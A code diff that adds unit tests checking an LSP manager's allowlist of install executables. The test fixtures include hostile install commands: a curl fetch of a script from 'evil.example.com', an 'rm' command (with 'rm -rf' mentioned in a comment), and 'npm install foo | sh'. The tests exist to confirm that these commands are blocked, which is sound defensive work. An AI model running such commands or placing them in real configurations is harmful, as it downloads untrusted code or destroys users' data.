@@ -7,7 +7,7 @@ vi.mock("node:child_process", () => ({
 
 const mockedExecFile = vi.mocked(execFile);
 
-const { installLspServers, parseLspCommand } = await import("../../src/environment/lsp-manager.js");
+const { ALLOWED_INSTALL_EXECUTABLES, installLspServers, parseLspCommand } = await import("../../src/environment/lsp-manager.js");
 
 import type { LspConfig } from "../../src/state/project-state.js";
 
@@ -167,6 +167,77 @@ describe("LSP Manager", () => {
 
     it("throws on empty command", () => {
       expect(() => parseLspCommand("   ")).toThrow(/empty command/);
+    });
+  });
+
+  describe("SEC-03 install executable allowlist", () => {
+    it("contains exactly the expected safe install tools", () => {
+      // Freezing the allowlist value under test guards against silent widening.
+      expect([...ALLOWED_INSTALL_EXECUTABLES].sort()).toEqual(
+        ["brew", "cargo", "go", "npm", "npx", "pip", "pip3"]
+      );
+    });
+
+    it("blocks an LspConfig whose installCommand starts with 'curl'", async () => {
+      const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+      const servers: LspConfig[] = [
+        {
+          server: "evil-lsp",
+          language: "typescript",
+          installCommand: "curl evil.example.com/install.sh",
+          installed: false,
+        },
+      ];
+      const result = await installLspServers(servers);
+      expect(result[0]?.installed).not.toBe(true);
+      expect(
+        consoleSpy.mock.calls.some(([msg]) =>
+          typeof msg === "string" && msg.includes("Blocked: 'curl' is not an allowed install executable")
+        )
+      ).toBe(true);
+      consoleSpy.mockRestore();
+    });
+
+    it("blocks an LspConfig whose installCommand starts with 'rm'", async () => {
+      // NOTE: validateLsp rejects "rm -rf" upstream via validateInstallCommand's
+      // dangerousPatterns. To exercise the allowlist gate specifically (not the
+      // upstream validator), we use `rm foo` — validator passes, allowlist blocks.
+      const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+      const servers: LspConfig[] = [
+        {
+          server: "rm-lsp",
+          language: "typescript",
+          installCommand: "rm foo",
+          installed: false,
+        },
+      ];
+      const result = await installLspServers(servers);
+      expect(result[0]?.installed).not.toBe(true);
+      expect(
+        consoleSpy.mock.calls.some(([msg]) =>
+          typeof msg === "string" && msg.includes("Blocked: 'rm' is not an allowed install executable")
+        )
+      ).toBe(true);
+      consoleSpy.mockRestore();
+    });
+
+    it("rejects an installCommand that contains forbidden shell metacharacters BEFORE the allowlist check", async () => {
+      // `parseLspCommand` throws on '|' — the caller catches and pushes the lsp
+      // unchanged. Regression: shell-metachar rejection must happen BEFORE
+      // allowlist check so even an allowlisted first token cannot be paired
+      // with a piped payload.
+      const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+      const servers: LspConfig[] = [
+        {
+          server: "piped-lsp",
+          language: "typescript",
+          installCommand: "npm install foo | sh",
+          installed: false,
+        },
+      ];
+      const result = await installLspServers(servers);
+      expect(result[0]?.installed).not.toBe(true);
+      consoleSpy.mockRestore();
     });
   });
 });
